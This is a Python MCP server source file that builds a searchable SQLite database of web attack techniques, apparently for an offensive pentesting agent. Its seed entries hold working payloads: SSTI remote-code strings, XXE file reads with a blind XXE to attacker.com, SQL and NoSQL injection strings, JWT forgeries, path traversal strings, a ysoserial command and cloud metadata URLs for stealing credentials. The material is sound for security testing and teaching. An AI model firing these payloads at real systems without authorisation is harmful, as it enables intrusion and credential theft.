#!/usr/bin/env python3
"""DexRed Technique RAG — MCP Server

SQLite FTS5-based technique search. The agent queries for attack techniques
relevant to a specific technology, vulnerability class, or pattern.

Populated from:
- PortSwigger Web Security Academy topics
- OWASP Testing Guide techniques
- Common attack patterns and payloads

Run as: python3 tools/rag/server.py
"""

import json
import os
import sqlite3
import sys

DB_PATH = os.environ.get("DEXRED_RAG_DB", "./techniques.db")


def get_db():
    db = sqlite3.connect(DB_PATH)
    db.row_factory = sqlite3.Row
    db.executescript("""
        CREATE VIRTUAL TABLE IF NOT EXISTS techniques USING fts5(
            title, category, tags, content, source,
            tokenize='porter unicode61'
        );
        CREATE TABLE IF NOT EXISTS technique_meta (
            id INTEGER PRIMARY KEY,
            title TEXT NOT NULL,
            category TEXT NOT NULL,
            tags TEXT,
            source TEXT,
            inserted_at TEXT DEFAULT (datetime('now'))
        );
    """)
    if db.execute("SELECT COUNT(*) FROM techniques").fetchone()[0] == 0:
        _seed_techniques(db)
    return db


def _seed_techniques(db):
    """Seed the database with built-in technique knowledge."""
    techniques = [
        ("JWT alg:none Attack", "authentication", "jwt,token,bypass,alg",
         "Set JWT algorithm to 'none' and remove the signature. If the server doesn't validate the algorithm, "
         "the token is accepted without verification. Steps: 1) Decode the JWT 2) Change header alg to 'none' "
         "3) Remove the signature (third part after the second dot) 4) Send the modified token. "
         "Works when the server uses a JWT library that accepts alg:none by default.",
         "PortSwigger JWT Attacks"),

        ("JWT kid Header Injection", "authentication", "jwt,kid,injection,path_traversal",
         "The 'kid' (Key ID) header parameter can be injectable. If the server uses kid to look up the signing "
         "key from a file or database, inject a path traversal: kid: '../../dev/null' with an empty secret, "
         "or kid: '../../etc/hostname' with the hostname as the HMAC secret. "
         "For SQL-based key lookup: kid: \"' UNION SELECT 'secret' -- \"",
         "PortSwigger JWT Attacks"),

        ("BOLA/IDOR via Numeric ID Enumeration", "access_control", "idor,bola,authorization,id",
         "When endpoints reference resources by numeric ID (/api/users/123), try incrementing/decrementing "
         "the ID while authenticated as a different user. Compare responses — if you get another user's data, "
         "IDOR is confirmed. Also test: encoded IDs (base64 decode, modify, re-encode), UUID prediction "
         "(if sequential v1 UUIDs), parameter pollution (?id=1&id=2).",
         "PortSwigger Access Control"),

        ("Time-Based Blind SQL Injection", "injection", "sqli,blind,time,sleep",
         "When no error or data difference is visible, inject time delays: "
         "MySQL: ' AND SLEEP(5)-- | PostgreSQL: ' AND pg_sleep(5)-- | MSSQL: '; WAITFOR DELAY '0:0:5'-- | "
         "SQLite: ' AND 1=randomblob(500000000)-- "
         "Measure response time. If the delay matches your payload, injection is confirmed. "
         "Always compare against a baseline request without the sleep.",
         "PortSwigger SQL Injection"),

        ("NoSQL Injection with MongoDB Operators", "injection", "nosql,mongodb,operator,bypass",
         "MongoDB query operators can bypass authentication or extract data: "
         "Login bypass: {\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}} "
         "Data extraction: {\"$regex\": \"^a\"} to enumerate character by character. "
         "Coupon/code bypass: {\"code\": {\"$gt\": \"\"}} returns any matching document. "
         "Always test $gt, $ne, $regex, $where operators on string input fields.",
         "OWASP NoSQL Injection"),

        ("SSRF via Cloud Metadata", "ssrf", "ssrf,cloud,metadata,aws,gcp",
         "When you find SSRF, test cloud metadata endpoints: "
         "AWS: http://169.254.169.254/latest/meta-data/ → /iam/security-credentials/ for temp creds "
         "GCP: http://metadata.google.internal/computeMetadata/v1/ (needs Metadata-Flavor: Google header) "
         "Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 "
         "Filter bypasses: decimal IP (2852039166), hex (0xA9FEA9FE), IPv6 (::ffff:169.254.169.254)",
         "PortSwigger SSRF"),

        ("Race Condition via Concurrent Requests", "business_logic", "race,concurrent,toctou",
         "State-changing operations vulnerable to TOCTOU (time-of-check to time-of-use): "
         "1) Identify: coupon apply, fund transfer, vote, purchase, account creation "
         "2) Script: Python asyncio + httpx to send 10-50 concurrent identical requests "
         "3) Check: did the coupon apply twice? Did balance go negative? Did you get double items? "
         "HTTP/2 single-packet attack gives best timing precision. "
         "Key: the vulnerability is in the gap between checking and applying state.",
         "PortSwigger Race Conditions"),

        ("Mass Assignment / Parameter Pollution", "access_control", "mass_assignment,parameter,privilege",
         "Add unexpected fields to POST/PUT/PATCH requests: "
         "{\"name\": \"test\", \"role\": \"admin\"} or {\"price\": 0, \"quantity\": 1000} "
         "The server may bind all request fields to the model without filtering. "
         "Common targets: role, is_admin, permissions, price, quantity, status, verified, balance. "
         "Test on registration, profile update, order update, and settings endpoints.",
         "PortSwigger Mass Assignment"),

        ("SSTI Detection and Exploitation", "injection", "ssti,template,rce,jinja2",
         "Detect template injection: {{7*7}} → 49 confirms injection. "
         "Engine detection: {{7*'7'}} → 7777777 (Jinja2) vs 49 (Twig). "
         "Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}} "
         "Twig RCE: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}} "
         "Test in: email templates, PDF generation, error messages, profile fields, feedback forms.",
         "PortSwigger SSTI"),

        ("CORS Misconfiguration", "api_security", "cors,origin,headers,credentials",
         "Test CORS by sending requests with: Origin: https://evil.com "
         "Vulnerable if response has: Access-Control-Allow-Origin: https://evil.com "
         "AND Access-Control-Allow-Credentials: true "
         "Wildcard (*) with credentials is blocked by browsers but may indicate weak config. "
         "Also test: Origin: null (sandboxed iframes), Origin: https://target.evil.com (subdomain matching).",
         "PortSwigger CORS"),

        ("OTP Brute Force via Missing Rate Limit", "authentication", "otp,brute_force,rate_limit,2fa",
         "4-digit OTP = 10,000 combinations. 6-digit = 1,000,000. "
         "Test: send 10+ incorrect OTPs rapidly. If no lockout/rate limit, brute force is feasible. "
         "Check both /v1/ and /v2/ API versions — often only one has rate limiting. "
         "Also check: does OTP expire? Can you reuse it? Does requesting a new one invalidate the old?",
         "OWASP Authentication Testing"),

        ("HTTP Request Smuggling", "api_security", "smuggling,cl,te,desync",
         "Exploit discrepancies between front-end and back-end HTTP parsing: "
         "CL.TE: Content-Length processed by front-end, Transfer-Encoding by back-end. "
         "TE.CL: Transfer-Encoding by front-end, Content-Length by back-end. "
         "Detection: send ambiguous requests and observe if the next request is corrupted. "
         "Impact: bypass security controls, access other users' requests, cache poisoning.",
         "PortSwigger HTTP Request Smuggling"),

        ("Prototype Pollution", "injection", "prototype,pollution,javascript,__proto__",
         "JavaScript prototype pollution via: __proto__, constructor.prototype, or Object.assign. "
         "Payloads: {\"__proto__\": {\"isAdmin\": true}} or {\"constructor\": {\"prototype\": {\"role\": \"admin\"}}} "
         "Test on any JSON endpoint that merges user input with server objects. "
         "Detection: add __proto__.polluted=true, then check if the property exists on new objects.",
         "PortSwigger Prototype Pollution"),

        ("HTTP Request Smuggling CL.TE", "http_smuggling", "smuggling,desync,cl,te,proxy",
         "Front-end uses Content-Length, back-end uses Transfer-Encoding. "
         "Send: POST / with Content-Length: 6 and Transfer-Encoding: chunked. Body: 0\\r\\n\\r\\nX. "
         "The front-end forwards 6 bytes, the back-end sees chunked with 0-length chunk (end). "
         "The trailing 'X' becomes the start of the next request on the back-end's socket. "
         "Detection: time-based — if back-end waits for more chunked data, delay increases by ~5s. "
         "Impact: bypass WAF, access internal endpoints, capture other users' requests, cache poisoning.",
         "PortSwigger HTTP Request Smuggling"),

        ("Web Cache Poisoning via Unkeyed Headers", "cache_poisoning", "cache,poison,header,xss",
         "Cache keys usually include Host + Path + Query but NOT arbitrary headers. "
         "If X-Forwarded-Host or X-Forwarded-Scheme changes the response (e.g., in link tags or redirects) "
         "but isn't in the cache key, sending a poisoned request caches malicious content for all users. "
         "Steps: 1) Identify caching (X-Cache: HIT, Age header). "
         "2) Find unkeyed headers that affect response (try X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL). "
         "3) Poison: send request with X-Forwarded-Host: evil.com, then verify clean request gets poisoned response.",
         "PortSwigger Web Cache Poisoning"),

        ("Web Cache Deception", "cache_poisoning", "cache,deception,sensitive,static",
         "Trick the cache into storing sensitive dynamic content by appending a static-looking extension. "
         "If /account/settings returns user data and the cache keys on path extension: "
         "/account/settings/anything.css may be cached because it ends in .css. "
         "The origin serves the real settings page (ignores the fake path). The cache stores it. "
         "Attacker visits the same URL and gets the victim's account page. "
         "Test with: .css, .js, .jpg, .png, .ico appended to sensitive endpoints.",
         "PortSwigger Web Cache Deception"),

        ("XXE — XML External Entity Injection", "injection", "xxe,xml,dtd,file_read,ssrf",
         "When the application parses XML input, inject an external entity to read files or make SSRF requests. "
         "Classic payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root> "
         "Blind XXE via parameter entities: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'>%xxe;]> "
         "Test: change Content-Type from application/json to application/xml and send XML equivalent. "
         "Many JSON APIs accept XML if you switch the Content-Type header.",
         "PortSwigger XXE"),

        ("Insecure Deserialization", "injection", "deserialization,rce,java,php,python,pickle",
         "When the app deserializes untrusted data, craft a malicious serialized object for RCE. "
         "Java: look for base64-encoded blobs starting with rO0 (Java serialization magic bytes). "
         "Use ysoserial to generate payloads: java -jar ysoserial.jar CommonsCollections1 'id' | base64. "
         "PHP: look for O: or a: prefixed strings. Craft __wakeup/__destruct chains. "
         "Python: pickle.loads on untrusted input → import os; os.system('id'). "
         "Detection: base64-decode cookies/parameters, check for serialization magic bytes.",
         "PortSwigger Insecure Deserialization"),

        ("Path Traversal / Local File Inclusion", "injection", "path_traversal,lfi,file_read,directory",
         "Access files outside the intended directory by manipulating file path parameters. "
         "Payloads: ../../../etc/passwd, ....//....//etc/passwd (double encoding), "
         "%2e%2e%2f%2e%2e%2f (URL encoded), ..%252f..%252f (double URL encoded), "
         "..\\..\\..\\windows\\win.ini (Windows). "
         "Test on: file download endpoints, image display, template inclusion, log file viewers. "
         "Null byte termination: ../../../etc/passwd%00.jpg (older systems). "
         "Confirm by reading a file with known content (etc/passwd, etc/hostname).",
         "PortSwigger Path Traversal"),

        ("GraphQL Introspection and Exploitation", "api_security", "graphql,introspection,batching,dos",
         "Introspection query: {__schema{types{name,fields{name,type{name}}}}} "
         "If disabled, try: {__type(name:\"User\"){fields{name}}} for partial discovery. "
         "Batching attack: send array of mutations in one request [{query1},{query2},...]. "
         "Alias-based rate limit bypass: {a:user(id:1){name} b:user(id:2){name} c:user(id:3){name}}. "
         "Nested query DoS: {user{friends{friends{friends{name}}}}} — exponential expansion. "
         "Field suggestion: misspell a field name and check if the error suggests valid fields.",
         "PortSwigger GraphQL"),

        ("WebSocket Hijacking and Injection", "websocket", "websocket,csrf,hijacking,injection",
         "Cross-site WebSocket hijacking (CSWSH): if the WS endpoint doesn't validate the Origin header, "
         "an attacker's page can open a WebSocket to the target and read the victim's real-time data. "
         "Test: connect with Origin: https://evil.com — if accepted, CSWSH is possible. "
         "Injection: WebSocket messages may be parsed as SQL, shell commands, or rendered as HTML — "
         "test the same injection payloads as HTTP parameters. "
         "Auth: check if WS connections work without auth or after session expiry.",
         "PortSwigger WebSockets"),

        ("OAuth2 Redirect URI Manipulation", "authentication", "oauth,redirect,open_redirect,token_theft",
         "The redirect_uri parameter in OAuth flows can be manipulated to steal authorization codes or tokens. "
         "Tests: redirect_uri=https://evil.com (open redirect), "
         "redirect_uri=https://legitimate.com.evil.com (subdomain confusion), "
         "redirect_uri=https://legitimate.com/../evil (path traversal), "
         "redirect_uri=https://legitimate.com%23.evil.com (fragment bypass). "
         "Also test: missing state parameter (CSRF via OAuth), PKCE bypass (omit code_verifier at token exchange), "
         "scope escalation (request higher scopes), token leakage via Referer header.",
         "PortSwigger OAuth"),

        ("Host Header Attacks", "injection", "host,header,poisoning,password_reset,routing",
         "The Host header can be abused for: "
         "Password reset poisoning: send reset request with Host: evil.com — the reset link points to attacker's domain. "
         "Routing-based SSRF: Host: internal-service.local may route to internal services. "
         "Web cache poisoning: if Host is unkeyed but affects the response. "
         "Virtual host discovery: try different Host values to find hidden vhosts. "
         "Test: X-Forwarded-Host, X-Host, X-Original-Host, Forwarded: host= as alternatives.",
         "PortSwigger Host Header Attacks"),

        ("CSRF without State Parameter", "authentication", "csrf,state,oauth,cross_site",
         "Cross-Site Request Forgery via missing anti-CSRF protections. "
         "Check: does the form include a CSRF token? Is the token validated server-side? "
         "For APIs: does the endpoint accept requests without Origin/Referer validation? "
         "For OAuth: is the state parameter required and validated? If optional, CSRF via OAuth. "
         "SameSite cookie bypass: if SameSite=Lax, POST requests from cross-site are blocked "
         "but GET requests within 2 minutes of a top-level navigation are allowed.",
         "PortSwigger CSRF"),

        ("DNS Rebinding for SSRF Bypass", "ssrf", "dns,rebinding,bypass,ssrf,filter",
         "Bypass SSRF URL filters that check the resolved IP before making the request. "
         "Set up a DNS record with a very short TTL (e.g., 1 second) that alternates between "
         "a valid external IP (passes the check) and 127.0.0.1 (the actual target). "
         "The server resolves the domain, sees a valid IP, allows the request. "
         "By the time the HTTP request is made, DNS resolves to the internal IP. "
         "Tools: rebinder.com, rbndr.us, or self-hosted DNS server with short TTL.",
         "PortSwigger SSRF Bypass"),

        ("Server-Side Parameter Pollution", "injection", "sspp,parameter,api,internal",
         "If the application builds internal API requests from user input, inject additional parameters. "
         "Example: user input 'name=test' becomes internal request '/api/internal?name=test'. "
         "Inject: name=test&role=admin — the internal API may process the extra parameter. "
         "Truncation: name=test%00&admin=true — null byte may truncate on one side but not the other. "
         "URL-encoded separators: name=test%26role%3Dadmin — bypasses client-side filtering.",
         "PortSwigger Server-Side Parameter Pollution"),

        ("Race Condition Single-Packet Attack", "business_logic", "race,http2,single_packet,concurrent",
         "HTTP/2 single-packet attack for precise race condition timing. "
         "Send all competing requests in a single TCP packet so they arrive at the server simultaneously. "
         "Python implementation: use httpx with HTTP/2, prepare all requests, send via single connection. "
         "Targets: coupon application (apply same coupon twice), fund transfer (double-spend), "
         "invitation/email verification (claim multiple times), voting (vote multiple times). "
         "The key insight: network jitter is eliminated when all requests share one TCP packet.",
         "PortSwigger Race Conditions"),
    ]

    for title, category, tags, content, source in techniques:
        db.execute(
            "INSERT INTO techniques (title, category, tags, content, source) VALUES (?,?,?,?,?)",
            (title, category, tags, content, source),
        )
        db.execute(
            "INSERT INTO technique_meta (title, category, tags, source) VALUES (?,?,?,?)",
            (title, category, tags, source),
        )
    db.commit()


def handle_search(db, params):
    query = params.get("query", "")
    category = params.get("category", "")
    limit = params.get("limit", 5)

    if not query:
        return {"error": "query is required"}

    fts_query = query.replace('"', '""')
    if category:
        fts_query = f'category:"{category}" AND ({fts_query})'

    rows = db.execute(
        "SELECT title, category, tags, content, source, rank FROM techniques WHERE techniques MATCH ? ORDER BY rank LIMIT ?",
        (fts_query, limit),
    ).fetchall()

    if not rows:
        rows = db.execute(
            "SELECT title, category, tags, content, source, rank FROM techniques WHERE techniques MATCH ? ORDER BY rank LIMIT ?",
            (query, limit),
        ).fetchall()

    results = []
    for r in rows:
        results.append({
            "title": r["title"],
            "category": r["category"],
            "tags": r["tags"],
            "content": r["content"],
            "source": r["source"],
            "relevance": round(-r["rank"], 2),
        })

    return {"query": query, "total": len(results), "techniques": results}


def handle_add_technique(db, params):
    title = params.get("title", "")
    category = params.get("category", "")
    tags = params.get("tags", "")
    content = params.get("content", "")
    source = params.get("source", "agent-discovered")

    if not title or not content:
        return {"error": "title and content are required"}

    db.execute(
        "INSERT INTO techniques (title, category, tags, content, source) VALUES (?,?,?,?,?)",
        (title, category, tags, content, source),
    )
    db.execute(
        "INSERT INTO technique_meta (title, category, tags, source) VALUES (?,?,?,?)",
        (title, category, tags, source),
    )
    db.commit()
    total = db.execute("SELECT COUNT(*) FROM technique_meta").fetchone()[0]
    return {"status": "added", "title": title, "total_techniques": total}


TOOLS = [
    {
        "name": "search_techniques",
        "description": "Search the technique knowledge base for attack methods relevant to a technology, vulnerability class, or pattern. Use when you encounter unfamiliar tech or need inspiration for new attack vectors.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "query": {"type": "string", "description": "Search query — technology name, vuln class, or attack pattern (e.g. 'jwt bypass', 'mongodb injection', 'race condition')"},
                "category": {"type": "string", "description": "Filter by category: authentication, injection, access_control, ssrf, business_logic, api_security"},
                "limit": {"type": "integer", "description": "Max results (default 5)"},
            },
            "required": ["query"],
        },
    },
    {
        "name": "add_technique",
        "description": "Add a new technique to the knowledge base — call this when you discover a working attack pattern not already documented.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "title": {"type": "string"},
                "category": {"type": "string"},
                "tags": {"type": "string", "description": "Comma-separated tags"},
                "content": {"type": "string", "description": "Full technique description with steps"},
                "source": {"type": "string", "description": "Where this technique came from"},
            },
            "required": ["title", "content"],
        },
    },
]

HANDLERS = {
    "search_techniques": handle_search,
    "add_technique": handle_add_technique,
}


def read_message():
    header = ""
    while True:
        line = sys.stdin.readline()
        if not line:
            return None
        header += line
        if line.strip() == "":
            break
    length = 0
    for h in header.strip().split("\n"):
        if h.lower().startswith("content-length:"):
            length = int(h.split(":")[1].strip())
    if length == 0:
        return None
    return json.loads(sys.stdin.read(length))


def send_message(msg):
    body = json.dumps(msg)
    sys.stdout.write(f"Content-Length: {len(body)}\r\n\r\n{body}")
    sys.stdout.flush()


def main():
    db = get_db()
    while True:
        msg = read_message()
        if msg is None:
            break
        method = msg.get("method", "")
        params = msg.get("params", {})
        msg_id = msg.get("id")

        if method == "initialize":
            result = {
                "protocolVersion": "2024-11-05",
                "capabilities": {"tools": {}},
                "serverInfo": {"name": "dexred-rag", "version": "1.0.0"},
            }
        elif method == "tools/list":
            result = {"tools": TOOLS}
        elif method == "tools/call":
            name = params.get("name", "")
            args = params.get("arguments", {})
            handler = HANDLERS.get(name)
            if handler:
                try:
                    tool_result = handler(db, args)
                    result = {"content": [{"type": "text", "text": json.dumps(tool_result, indent=2)}]}
                except Exception as e:
                    result = {"content": [{"type": "text", "text": f"Error: {e}"}], "isError": True}
            else:
                result = {"content": [{"type": "text", "text": f"Unknown tool: {name}"}], "isError": True}
        elif method == "notifications/initialized":
            continue
        else:
            result = {"error": {"code": -32601, "message": f"Unknown method: {method}"}}

        if msg_id is not None:
            send_message({"jsonrpc": "2.0", "id": msg_id, "result": result})


if __name__ == "__main__":
    main()
